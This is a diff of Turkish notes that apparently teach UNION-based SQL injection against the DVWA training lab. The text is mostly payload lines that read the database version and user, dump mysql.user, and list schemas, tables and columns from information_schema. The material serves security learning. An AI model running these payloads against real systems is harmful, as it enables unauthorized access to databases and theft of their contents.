@@ -34,30 +34,41 @@ COLUMN_NAME
 
 işimize yarayacak kolon COLUMN_NAME
 
-Şimdi bu öğrendiklerimizi test edelim, veritabanını versiyonumuzu öğrenelim
 
+Şimdi bu öğrendiklerimizi test edelim 
+===================================================================================================================
+'veritabanını versiyonumuzu öğrenelim'
 select version()
-
-Şimdi veritabanımızın kullanıcısını öğrenelim
-
+-------------------------------------------------------------------------------------------------------------------
+'Şimdi veritabanımızın kullanıcısını öğrenelim'
 SELECT user(); 
 SELECT system_user();
 Yada tüm mysql veritanlarında bulunan mysql ile buluruz;
 UNION SELECT user FROM mysql.user;
+--------------------------------------------------------------------------------------------------------------------
 
-Mysql'deki tüm veri tabanlarına ulaşalım'
+'Mysql deki tüm veri tabanlarına ulaşalım'
 
 UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database();
 
 UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA NOT LIKE 'information_schema';
 
-
 UNION SELECT schema_name FROM information_schema.schemata;
 
-DVWA 'veritabanındaki tablolara ulaşalım'
+--------------------------------------------------------------------------------------------------------------------
+'DVWA veritabanındaki tablolara ulaşalım'
+
 UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = 'dvwa';
 
+--------------------------------------------------------------------------------------------------------------------
 
+'DVWA Veitabanından Kolonlara Ulaşma'
+
+UNION SELECT TABLE_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'dwva'
+
+union select concat_ws(0x3a,table_name,column_name)from information_schema.COLUMNS where table_schema='sqlinjection'
+
+--------------------------------------------------------------------------------------------------------------------
 
 UNION select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns;
 
